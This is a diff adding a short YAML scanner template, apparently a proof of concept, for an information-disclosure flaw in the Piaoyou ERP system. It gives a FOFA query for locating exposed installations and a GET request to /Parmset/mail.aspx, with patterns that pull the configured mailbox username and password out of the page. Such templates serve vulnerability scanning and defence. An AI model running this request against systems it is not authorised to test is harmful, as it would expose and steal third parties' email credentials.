@@ -1,0 +1,16 @@
+id: poc-yaml-piaoyou-erp-ms-mail-aspx-info-leak
+info:
+  name: 票友ERP管理系统 mail.aspx 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 票友ERP管理系统
+  fofa: (body="css/sexybuttons.css" && body="Ajax/confirm.ashx") || title="票友ERP"
+requests:
+- method: GET
+  path: /Parmset/mail.aspx
+  expression: status_code == 200 && matches(body,"<input name=\"mailuser\" type=\"text\"
+    value=\"([0-9a-z_]+)\" id=\"mailuser\"") && matches(body,"<input name=\"mailpwd\"
+    type=\"text\" value=\"([0-9a-z]+)\" id=\"mailpwd\"") && contains(body,"邮箱参数设置")
+variables: {}
+transport: http
